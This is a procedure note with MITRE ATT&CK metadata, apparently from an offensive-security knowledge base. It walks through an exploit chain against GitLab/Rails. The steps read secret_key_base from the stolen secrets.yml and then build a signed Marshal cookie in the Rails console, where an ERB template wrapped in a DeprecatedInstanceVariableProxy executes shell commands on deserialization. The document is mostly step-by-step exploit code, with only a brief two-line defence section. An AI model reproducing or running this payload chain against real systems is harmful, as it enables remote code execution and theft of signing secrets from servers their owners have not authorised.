---
tags:
  - deserialization
  - payload-generation
type: procedure
tools:
  - '[[tools/Rails-Console]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Linux
techniques:
  - '[[Exploitation for Credential Access]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: c4aa3363-d491-431a-95a3-3cc310cb21a9
created_at: '2025-12-11T03:47:59.324Z'
updated_at: '2025-12-11T03:47:59.324Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1212]]'
---
# Extract Secrets and Generate Marshalled Payload

## Summary

This procedure uses the file read vulnerability to obtain secret_key_base from secrets.yml, then generates a marshalled ERB payload in Rails console for insecure deserialization.

## Description

After reading secrets.yml, modify a local GitLab instance's secret_key_base to match, and use Rails console to create a payload that executes commands via ERB when deserialized.

## Requirements

1. Access to stolen secrets.yml
2. Local GitLab/Rails environment
3. Rails console access

## Defense

Defensive measures and detection strategies:

- Disable :hybrid cookie serialization
- Protect secret_key_base

## Objectives

1. Obtain signing key
2. Craft RCE payload
3. Prepare for deserialization attack

## Instructions

### Step 1: Read Secrets File

**Context**: Use previous file read to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml.

Extract secret_key_base.

### Step 2: Setup Rails Request

**Command** ([[commands/rails-request-setup]]):
```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
```

> Creates a request object.

### Step 3: Set Serializer

**Command** ([[commands/rails-set-serializer]]):
```ruby
request.env["action_dispatch.cookies_serializer"]=:marshal
```

> Enables marshal serialization.

### Step 4: Get Cookie Jar

**Command** ([[commands/rails-cookie-jar]]):
```ruby
cookies = request.cookie_jar
```

> Retrieves cookie jar.

### Step 5: Create ERB Payload

**Command** ([[commands/erb-payload-create]]):
```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

> Builds command execution template.

### Step 6: Create Deprecation Proxy

**Command** ([[commands/deprecation-proxy-create]]):
```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

> Wraps ERB for exploit.

### Step 7: Sign Cookie

**Command** ([[commands/cookies-sign]]):
```ruby
cookies.signed[:cookie]= depr
```

> Signs the payload.

### Step 8: Output Payload

**Command** ([[commands/puts-cookie]]):
```ruby
puts cookies[:cookie]
```

> Prints base64 payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Credential Access]]

### Sub-Techniques



## Commands Used

- [[commands/rails-request-setup]]
- [[commands/rails-set-serializer]]
- [[commands/rails-cookie-jar]]
- [[commands/erb-payload-create]]
- [[commands/deprecation-proxy-create]]
- [[commands/cookies-sign]]
- [[commands/puts-cookie]]

## Tools Used

- [[tools/Rails-Console]]

## Tags

- deserialization
- payload-generation
